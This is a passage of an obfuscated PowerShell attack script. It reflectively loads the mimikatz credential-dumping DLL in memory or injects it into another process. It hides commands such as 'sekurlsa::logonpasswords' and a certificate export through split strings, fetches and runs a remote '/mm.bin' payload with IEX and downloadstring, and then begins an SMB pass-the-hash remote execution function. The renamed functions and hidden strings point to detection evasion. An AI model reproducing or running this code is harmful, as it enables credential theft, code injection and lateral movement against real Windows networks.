            $ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
            


            Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $KSDGKJSDHTMP
            $KSDGKJSDHTMP = Add-SignedIntAsUnsigned $KSDGKJSDHTMP ($Shellcode1.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $KSDGKJSDHTMP, $false)
            $KSDGKJSDHTMP = Add-SignedIntAsUnsigned $KSDGKJSDHTMP $PtrSize
            Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $KSDGKJSDHTMP
            $KSDGKJSDHTMP = Add-SignedIntAsUnsigned $KSDGKJSDHTMP ($Shellcode2.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $KSDGKJSDHTMP, $false)
            $KSDGKJSDHTMP = Add-SignedIntAsUnsigned $KSDGKJSDHTMP $PtrSize
            Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $KSDGKJSDHTMP

            $l64ftion.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        }


        Write-Output $ReturnArray
    }
    
    


    Function SDHlhuhWEDSDDS
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Array[]]
        $CopyInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $l64ftion,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $WiSDGKDants
        )

        [UInt32]$OldProtectFlag = 0
        foreach ($Info in $CopyInfo)
        {
            $Success = $l64ftion.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$WiSDGKDants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }
            
            $l64ftion.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
            
            $l64ftion.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        }
    }





    Function GessKUDBSD
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $LKSHKDANDL,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $FunctionName
        )
        
        $DJH32H = LGDJSR
        $WiSDGKDants = Get-WiSDGKDants
        $LSIINFO = KDHSD-JUWF -LKSHKDANDL $LKSHKDANDL -DJH32H $DJH32H -WiSDGKDants $WiSDGKDants
        

        if ($LSIINFO.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
        {
            return [IntPtr]::Zero
        }
        $ExportTablePtr = Add-SignedIntAsUnsigned ($LKSHKDANDL) ($LSIINFO.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
        $ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$DJH32H.IMAGE_EXPORT_DIRECTORY)
        
        for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
        {

            $NameOffsetPtr = Add-SignedIntAsUnsigned ($LKSHKDANDL) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
            $NamePtr = Add-SignedIntAsUnsigned ($LKSHKDANDL) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
            $Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

            if ($Name -ceq $FunctionName)
            {


                $OrdinalPtr = Add-SignedIntAsUnsigned ($LKSHKDANDL) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
                $FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
                $FuncOffsetAddr = Add-SignedIntAsUnsigned ($LKSHKDANDL) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
                $FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
                return Add-SignedIntAsUnsigned ($LKSHKDANDL) ($FuncOffset)
            }
        }
        
        return [IntPtr]::Zero
    }


    Function LHSDGUKsdHF
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $PPSDHKDSDBytes,
        
        [Parameter(Position = 1, Mandatory = $false)]
        [String]
        $EAIUFHS,
        
        [Parameter(Position = 2, Mandatory = $false)]
        [IntPtr]
        $applejuce
        )
        
        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        

        $WiSDGKDants = Get-WiSDGKDants
        $l64ftion = Get-l64ftion
        $DJH32H = LGDJSR
        
        $RemoteLoading = $false
        if (($applejuce -ne $null) -and ($applejuce -ne [IntPtr]::Zero))
        {
            $RemoteLoading = $true
        }
        

        Write-Verbose "Getting basic PE information from the file"
        $LSIINFO = DHWE-kidD -PPSDHKDSDBytes $PPSDHKDSDBytes -DJH32H $DJH32H
        $OriginalImageBase = $LSIINFO.OriginalImageBase
        $NXCompatible = $true
        if (([Int] $LSIINFO.DllCharacteristics -band $WiSDGKDants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $WiSDGKDants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
        {
            Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
            $NXCompatible = $false
        }
        
        

        $Process64Bit = $true
        if ($RemoteLoading -eq $true)
        {
            $Hand32Ker = $l64ftion.GetModuleHandle.Invoke("kernel32.dll")
            $Result = $l64ftion.GetProcAddress.Invoke($Hand32Ker, "IsWow64Process")
            if ($Result -eq [IntPtr]::Zero)
            {
                Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
            }
            
            [Bool]$Wow64Process = $false
            $Success = $l64ftion.IsWow64Process.Invoke($applejuce, [Ref]$Wow64Process)
            if ($Success -eq $false)
            {
                Throw "Call to IsWow64Process failed"
            }
            
            if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
            {
                $Process64Bit = $false
            }
            

            $PowerShell64Bit = $true
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $PowerShell64Bit = $false
            }
            if ($PowerShell64Bit -ne $Process64Bit)
            {
                throw "Pss"
            }
        }
        else
        {
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $Process64Bit = $false
            }
        }
        if ($Process64Bit -ne $LSIINFO.PE64Bit)
        {
            Throw "hs"
        }
        


        Write-Verbose "Allocating memory for the PE and write its headers to memory"
        
        [IntPtr]$LoadAddr = [IntPtr]::Zero
        if (([Int] $LSIINFO.DllCharacteristics -band $WiSDGKDants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -ne $WiSDGKDants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)
        {
            Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again" -WarningAction Continue
            [IntPtr]$LoadAddr = $OriginalImageBase
        }

        $LKSHKDANDL = [IntPtr]::Zero              #This is where the PE is allocated in PowerShell
        $EffectiveLKSHKDANDL = [IntPtr]::Zero     #This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $LKSHKDANDL. If it is loaded in a remote process, this is the address in the remote process.
        if ($RemoteLoading -eq $true)
        {

            $LKSHKDANDL = $l64ftion.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$LSIINFO.SizeOfImage, $WiSDGKDants.MEM_COMMIT -bor $WiSDGKDants.MEM_RESERVE, $WiSDGKDants.PAGE_READWRITE)
            

            $EffectiveLKSHKDANDL = $l64ftion.VirtualAllocEx.Invoke($applejuce, $LoadAddr, [UIntPtr]$LSIINFO.SizeOfImage, $WiSDGKDants.MEM_COMMIT -bor $WiSDGKDants.MEM_RESERVE, $WiSDGKDants.PAGE_EXECUTE_READWRITE)
            if ($EffectiveLKSHKDANDL -eq [IntPtr]::Zero)
            {
                Throw "ULse"
            }
        }
        else
        {
            if ($NXCompatible -eq $true)
            {
                $LKSHKDANDL = $l64ftion.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$LSIINFO.SizeOfImage, $WiSDGKDants.MEM_COMMIT -bor $WiSDGKDants.MEM_RESERVE, $WiSDGKDants.PAGE_READWRITE)
            }
            else
            {
                $LKSHKDANDL = $l64ftion.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$LSIINFO.SizeOfImage, $WiSDGKDants.MEM_COMMIT -bor $WiSDGKDants.MEM_RESERVE, $WiSDGKDants.PAGE_EXECUTE_READWRITE)
            }
            $EffectiveLKSHKDANDL = $LKSHKDANDL
        }
        
        [IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($LKSHKDANDL) ([Int64]$LSIINFO.SizeOfImage)
        if ($LKSHKDANDL -eq [IntPtr]::Zero)
        { 
            Throw "Viskjdhd"
        }       
        [System.Runtime.InteropServices.Marshal]::Copy($PPSDHKDSDBytes, 0, $LKSHKDANDL, $LSIINFO.SizeOfHeaders) | Out-Null
        
        

        Write-Verbose "Getting detailed PE information from the headers loaded in memory"
        $LSIINFO = KDHSD-JUWF -LKSHKDANDL $LKSHKDANDL -DJH32H $DJH32H -WiSDGKDants $WiSDGKDants
        $LSIINFO | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
        $LSIINFO | Add-Member -MemberType NoteProperty -Name EffectiveLKSHKDANDL -Value $EffectiveLKSHKDANDL
        Write-Verbose "workhards: $LKSHKDANDL    EndAddress: $PEEndAddress"
        
        

        Write-Verbose "Copy PE sections in to memory"
        Cthis-SectioDSns -PPSDHKDSDBytes $PPSDHKDSDBytes -LSIINFO $LSIINFO -l64ftion $l64ftion -DJH32H $DJH32H
        
        

        Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
        LSHDjh3-upd -LSIINFO $LSIINFO -OriginalImageBase $OriginalImageBase -WiSDGKDants $WiSDGKDants -DJH32H $DJH32H

        

        Write-Verbose "Import DLL's needed by the PE we are loading"
        if ($RemoteLoading -eq $true)
        {
            lhsdu-jsd -LSIINFO $LSIINFO -l64ftion $l64ftion -DJH32H $DJH32H -WiSDGKDants $WiSDGKDants -applejuce $applejuce
        }
        else
        {
            lhsdu-jsd -LSIINFO $LSIINFO -l64ftion $l64ftion -DJH32H $DJH32H -WiSDGKDants $WiSDGKDants
        }
        
        

        if ($RemoteLoading -eq $false)
        {
            if ($NXCompatible -eq $true)
            {
                Write-Verbose "Update memory protection flags"
                usdKdhdf -LSIINFO $LSIINFO -l64ftion $l64ftion -WiSDGKDants $WiSDGKDants -DJH32H $DJH32H
            }
            else
            {
                Write-Verbose "LSDdlsdte"
            }
        }
        else
        {
            Write-Verbose "skdsJHWDons"
        }
        
        

        if ($RemoteLoading -eq $true)
        {
            [UInt32]$NumBytesWritten = 0
            $Success = $l64ftion.WriteProcessMemory.Invoke($applejuce, $EffectiveLKSHKDANDL, $LKSHKDANDL, [UIntPtr]($LSIINFO.SizeOfImage), [Ref]$NumBytesWritten)
            if ($Success -eq $false)
            {
                Throw "SLKDHLKD"
            }
        }
        
        

        if ($LSIINFO.FileType -ieq "DLL")
        {
            if ($RemoteLoading -eq $false)
            {
                Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
                $DllMainPtr = Add-SignedIntAsUnsigned ($LSIINFO.LKSHKDANDL) ($LSIINFO.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
                $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
                $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
                
                $DllMain.Invoke($LSIINFO.LKSHKDANDL, 1, [IntPtr]::Zero) | Out-Null
            }
            else
            {
                $DllMainPtr = Add-SignedIntAsUnsigned ($EffectiveLKSHKDANDL) ($LSIINFO.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
            
                if ($LSIINFO.PE64Bit -eq $true)
                {

                    $LookingFor = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
                    $Thisdayone = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
                    $Findwords = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
                }
                else
                {

                    $LookingFor = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
                    $Thisdayone = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
                    $Findwords = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
                }
                $SCLength = $LookingFor.Length + $Thisdayone.Length + $Findwords.Length + ($PtrSize * 2)
                $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
                $SCPSMemOriginal = $SCPSMem
                
                Write-BytesToMemory -Bytes $LookingFor -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LookingFor.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectiveLKSHKDANDL, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $Thisdayone -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($Thisdayone.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $Findwords -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($Findwords.Length)
                
                $RSCAddr = $l64ftion.VirtualAllocEx.Invoke($applejuce, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $WiSDGKDants.MEM_COMMIT -bor $WiSDGKDants.MEM_RESERVE, $WiSDGKDants.PAGE_EXECUTE_READWRITE)
                if ($RSCAddr -eq [IntPtr]::Zero)
                {
                    Throw "KSHDD"
                }
                
                $Success = $l64ftion.WriteProcessMemory.Invoke($applejuce, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
                if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
                {
                    Throw "SLKDHLKD"
                }

                $RThreadHandle = sadkjhdsjD -ProcessHandle $applejuce -workhards $RSCAddr -l64ftion $l64ftion #-
                $Result = $l64ftion.WaitForSingleObject.Invoke($RThreadHandle, 20000)
                if ($Result -ne 0)
                {
                    Throw "sd22."
                }
                
                $l64ftion.VirtualFreeEx.Invoke($applejuce, $RSCAddr, [UIntPtr][UInt64]0, $WiSDGKDants.MEM_RELEASE) | Out-Null
            }
        }
        elseif ($LSIINFO.FileType -ieq "EXE")
        {

            [IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
            [System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
            $OverwrittenMemInfo = KSHDUWKHF -LSIINFO $LSIINFO -l64ftion $l64ftion -WiSDGKDants $WiSDGKDants -ExeArguments $EAIUFHS -ExeDoneBytePtr $ExeDoneBytePtr



            [IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($LSIINFO.LKSHKDANDL) ($LSIINFO.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
            Write-Verbose "Call EXE Main function. Address: $ExeMainPtr. Creating thread for the EXE to run in."

            $l64ftion.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

            while($true)
            {
                [Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
                if ($ThreadDone -eq 1)
                {
                    SDHlhuhWEDSDDS -CopyInfo $OverwrittenMemInfo -l64ftion $l64ftion -WiSDGKDants $WiSDGKDants
                    Write-Verbose "EXE thread has completed."
                    break
                }
                else
                {
                    Start-Sleep -Seconds 1
                }
            }
        }
        
        return @($LSIINFO.LKSHKDANDL, $EffectiveLKSHKDANDL)
    }
    
    
    Function SDLHLESDME
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $LKSHKDANDL
        )
        

        $WiSDGKDants = Get-WiSDGKDants
        $l64ftion = Get-l64ftion
        $DJH32H = LGDJSR
        
        $LSIINFO = KDHSD-JUWF -LKSHKDANDL $LKSHKDANDL -DJH32H $DJH32H -WiSDGKDants $WiSDGKDants
        

        if ($LSIINFO.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$LSIINFO.LKSHKDANDL) ([Int64]$LSIINFO.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
            
            while ($true)
            {
                $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$DJH32H.IMAGE_IMPORT_DESCRIPTOR)
                

                if ($ImportDescriptor.Characteristics -eq 0 `
                        -and $ImportDescriptor.FirstThunk -eq 0 `
                        -and $ImportDescriptor.ForwarderChain -eq 0 `
                        -and $ImportDescriptor.Name -eq 0 `
                        -and $ImportDescriptor.TimeDateStamp -eq 0)
                {
                    Write-Verbose "DonSIDE"
                    break
                }

                $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$LSIINFO.LKSHKDANDL) ([Int64]$ImportDescriptor.Name)))
                $UMSKHDDLE = $l64ftion.GetModuleHandle.Invoke($ImportDllPath)

                if ($UMSKHDDLE -eq $null)
                {
                    Write-Warning "Errosdays" -WarningAction Continue
                }
                
                $Success = $l64ftion.FreeLibrary.Invoke($UMSKHDDLE)
                if ($Success -eq $false)
                {
                    Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
                }
                
                $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$DJH32H.IMAGE_IMPORT_DESCRIPTOR))
            }
        }
        

        Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
        $DllMainPtr = Add-SignedIntAsUnsigned ($LSIINFO.LKSHKDANDL) ($LSIINFO.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
        $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
        $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
        
        $DllMain.Invoke($LSIINFO.LKSHKDANDL, 0, [IntPtr]::Zero) | Out-Null
        
        
        $Success = $l64ftion.VirtualFree.Invoke($LKSHKDANDL, [UInt64]0, $WiSDGKDants.MEM_RELEASE)
        if ($Success -eq $false)
        {
            Write-Warning "Unays." -WarningAction Continue
        }
    }


    Function Main
    {
        $l64ftion = Get-l64ftion
        $DJH32H = LGDJSR
        $WiSDGKDants =  Get-WiSDGKDants
        
        $applejuce = [IntPtr]::Zero
    

        if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
        {
            Throw "Can't supply a ProcId and ProcName, choose one or the other"
        }
        elseif ($ProcName -ne $null -and $ProcName -ne "")
        {
            $Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
            if ($Processes.Count -eq 0)
            {
                Throw "Cacess $ProcName"
            }
            elseif ($Processes.Count -gt 1)
            {
                $ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
                Write-Output $ProcInfo
                Throw "Mosreto."
            }
            else
            {
                $ProcId = $Processes[0].ID
            }
        }
        







        
        if (($ProcId -ne $null) -and ($ProcId -ne 0))
        {
            $applejuce = $l64ftion.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
            if ($applejuce -eq [IntPtr]::Zero)
            {
                Throw "Couldn't obtain the handle for process ID: $ProcId"
            }
            
            Write-Verbose "Got the handle for the remote process to inject in to"
        }
        


        Write-Verbose "Calling LHSDGUKsdHF"

        try
        {
            $Processors = Get-WmiObject -Class Win32_Processor
        }
        catch
        {
            throw ($_.Exception)
        }

        if ($Processors -is [array])
        {
            $Processor = $Processors[0]
        } else {
            $Processor = $Processors
        }

        if ( ( $Processor.AddressWidth) -ne (([System.IntPtr]::Size)*8) )
        {
            Write-Verbose ( "Architecture: " + $Processor.AddressWidth + " Process: " + ([System.IntPtr]::Size * 8))
            Write-Error "PowerShell architecture (32bit/64bit) doesn't match OS architecture. 64bit PS must be used on a 64bit OS." -ErrorAction Stop
        }


        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
        {
            [Byte[]]$PPSDHKDSDBytes = [Byte[]][Convert]::FromBase64String($PPSDHKDSDBytSHDSDes32)
        }
        else
        {
            [Byte[]]$PPSDHKDSDBytes = [Byte[]][Convert]::FromBase64String($PPSDHKDSDBytes32)
        }
        $PPSDHKDSDBytes[0] = 0
        $PPSDHKDSDBytes[1] = 0
        $LKSHKDANDL = [IntPtr]::Zero
        if ($applejuce -eq [IntPtr]::Zero)
        {
            $PLFinfo = LHSDGUKsdHF -PPSDHKDSDBytes $PPSDHKDSDBytes -EAIUFHS $EAIUFHS
        }
        else
        {
            $PLFinfo = LHSDGUKsdHF -PPSDHKDSDBytes $PPSDHKDSDBytes -EAIUFHS $EAIUFHS -applejuce $applejuce
        }
        if ($PLFinfo -eq [IntPtr]::Zero)
        {
            Throw "Unable to load PE, handle returned is NULL"
        }
        
        $LKSHKDANDL = $PLFinfo[0]
        $RemoteLKSHKDANDL = $PLFinfo[1] #only matters if you loaded in to a remote process
        
        

        $LSIINFO = KDHSD-JUWF -LKSHKDANDL $LKSHKDANDL -DJH32H $DJH32H -WiSDGKDants $WiSDGKDants
        if (($LSIINFO.FileType -ieq "DLL") -and ($applejuce -eq [IntPtr]::Zero))
        {



                    Write-Verbose "Calling function with WString return type"
                    [IntPtr]$WStringFuncAddr = GessKUDBSD -LKSHKDANDL $LKSHKDANDL -FunctionName "powershell_reflective_mimikatz"
                    if ($WStringFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $WStringFuncDelegate = Get-DelegateType @([IntPtr]) ([IntPtr])
                    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
                    $WStringInput = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($EAIUFHS)
                    [IntPtr]$OutputPtr = $WStringFunc.Invoke($WStringInput)
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($WStringInput)
                    if ($OutputPtr -eq [IntPtr]::Zero)
                    {
                        Throw "Unable to get output, Output Ptr is NULL"
                    }
                    else
                    {
                        $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
                        Write-Output $Output
                        $l64ftion.LocalFree.Invoke($OutputPtr);
                    }



        }

        elseif (($LSIINFO.FileType -ieq "DLL") -and ($applejuce -ne [IntPtr]::Zero))
        {
            $THISFunLHcAddr = GessKUDBSD -LKSHKDANDL $LKSHKDANDL -FunctionName "VoidFunc"
            if (($THISFunLHcAddr -eq $null) -or ($THISFunLHcAddr -eq [IntPtr]::Zero))
            {
                Throw "VoidFunc couldn't be found in the DLL"
            }
            
            $THISFunLHcAddr = bud-ksgLHDnwn $THISFunLHcAddr $LKSHKDANDL
            $THISFunLHcAddr = Add-SignedIntAsUnsigned $THISFunLHcAddr $RemoteLKSHKDANDL
            

            $RThreadHandle = sadkjhdsjD -ProcessHandle $applejuce -workhards $THISFunLHcAddr -l64ftion $l64ftion #-
        }
        

        if ($applejuce -eq [IntPtr]::Zero)
        {
            SDLHLESDME -LKSHKDANDL $LKSHKDANDL
        }
        else
        {

            $Success = $l64ftion.VirtualFree.Invoke($LKSHKDANDL, [UInt64]0, $WiSDGKDants.MEM_RELEASE)
            if ($Success -eq $false)
            {
                Write-Warning "." -WarningAction Continue
            }
        }
        
        Write-Verbose "Done!"
    }

    Main
}


Function Main
{
    if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
    {
        $DebugPreference  = "Continue"
    }
    
    Write-Verbose "PowerShell ProcessID: $PID"
    

    if ($PsCmdlet.ParameterSetName -ieq "Dumpbred")
    {
        $EAIUFHS = "s"+"ekur"+"l`sa"+":"+":lo"+"g`on"+"pas"+"s`w"+"or`ds exit"
    }
    elseif ($PsCmdlet.ParameterSetName -ieq "Goingbots")
    {
        $EAIUFHS = "cry"+"pto::"+"c`ng c"+"ry`pto:"+":ca"+"pi `"cryp"+"t`o:`:ce"+"rti`fi"+"c`ates /ex"+"po`rt`" `"c`r"+"yp`to::c"+"e`rti"+"fic`a`tes /e`xp"+"or`t /sy"+"st`em"+"st`or"+"e`:C"+"ER`T_SY"+"S`TEM_S"+"TO`RE_L"+"OC`AL_M"+"AC`H"+"I`NE`" ex"+"it"
    }
    else
    {
        $EAIUFHS = $Command
    }

    [System.IO.Directory]::SetCurrentDirectory($pwd)
	if(test-path $env:tmp\mimi.dat) {
		$f_content = get-content $env:tmp\mimi.dat
		$PPSDHKDSDBytSHDSDes32 = $f_content[0]
		$PPSDHKDSDBytes32 = $f_content[1]
	} else {
		IEX (New-Object Net.WebClient).downloadstring($+'/mm.bin')
	}

    if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
    {
        Invoke-Command -ScriptBlock $LSHDUGF -ArgumentList @($PPSDHKDSDBytSHDSDes32, $PPSDHKDSDBytes32, "Void", 0, "", $EAIUFHS)
    }
    else
    {
        Invoke-Command -ScriptBlock $LSHDUGF -ArgumentList @($PPSDHKDSDBytSHDSDes32, $PPSDHKDSDBytes32, "Void", 0, "", $EAIUFHS) -ComputerName $ComputerName
    }
}



$results = Main;

$results
}

function Invoke-SE
{
[CmdletBinding(DefaultParametersetName='Default')]
param
(
    [parameter(Mandatory=$false)][String]$Target,
    [parameter(ParameterSetName='Auth',Mandatory=$true)][String]$Username,
    [parameter(ParameterSetName='Auth',Mandatory=$false)][String]$Domain,
    [parameter(Mandatory=$false)][String]$Command,
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$CommandCOMSPEC="Y",
    [parameter(ParameterSetName='Auth',Mandatory=$true)][ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})][String]$Hash,
    [parameter(Mandatory=$false)][String]$Service,
    [parameter(Mandatory=$false)][ValidateSet("Auto","1","2.1")][String]$Version="Auto",
    [parameter(ParameterSetName='Session',Mandatory=$false)][Int]$Session,
    [parameter(ParameterSetName='Session',Mandatory=$false)][Switch]$Logoff,
    [parameter(ParameterSetName='Session',Mandatory=$false)][Switch]$Refresh,
    [parameter(Mandatory=$false)][Int]$Sleep=150
)

if($PsCmdlet.ParameterSetName -ne 'Session' -and !$Target)
{
    Write-Output "[-] Target is required when not using -Session"
    throw
}

if($Command)
{
    $SMB_execute = $true
}

if($Version -eq '1')
{
    $SMB_version = 'SMB1'
}
elseif($Version -eq '2.1')
{
    $SMB_version = 'SMB2.1'
}

if($PsCmdlet.ParameterSetName -ne 'Auth' -and $PsCmdlet.ParameterSetName -ne 'Session')
{
    $signing_check = $true
}

function ConvertFrom-PacketOrderedDictionary
{
    param($OrderedDictionary)

    ForEach($field in $OrderedDictionary.Values)
    {
        $byte_array += $field
    }

    return $byte_array
}

#NetBIOS

function New-PacketNetBIOSSessionService
{
    param([Int]$HeaderLength,[Int]$DataLength)

    [Byte[]]$length = ([System.BitConverter]::GetBytes($HeaderLength + $DataLength))[2..0]

    $NetBIOSSessionService = New-Object System.Collections.Specialized.OrderedDictionary
    $NetBIOSSessionService.Add("MessageType",[Byte[]](0x00))
    $NetBIOSSessionService.Add("Length",$length)

    return $NetBIOSSessionService
}

#SMB1

function New-PacketSMBHeader
{
    param([Byte[]]$Command,[Byte[]]$Flags,[Byte[]]$Flags2,[Byte[]]$TreeID,[Byte[]]$ProcessID,[Byte[]]$UserID)

    $ProcessID = $ProcessID[0,1]

    $SMBHeader = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBHeader.Add("Protocol",[Byte[]](0xff,0x53,0x4d,0x42))
    $SMBHeader.Add("Command",$Command)
    $SMBHeader.Add("ErrorClass",[Byte[]](0x00))
    $SMBHeader.Add("Reserved",[Byte[]](0x00))
    $SMBHeader.Add("ErrorCode",[Byte[]](0x00,0x00))
    $SMBHeader.Add("Flags",$Flags)
    $SMBHeader.Add("Flags2",$Flags2)
    $SMBHeader.Add("ProcessIDHigh",[Byte[]](0x00,0x00))
    $SMBHeader.Add("Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMBHeader.Add("Reserved2",[Byte[]](0x00,0x00))
    $SMBHeader.Add("TreeID",$TreeID)
    $SMBHeader.Add("ProcessID",$ProcessID)
    $SMBHeader.Add("UserID",$UserID)
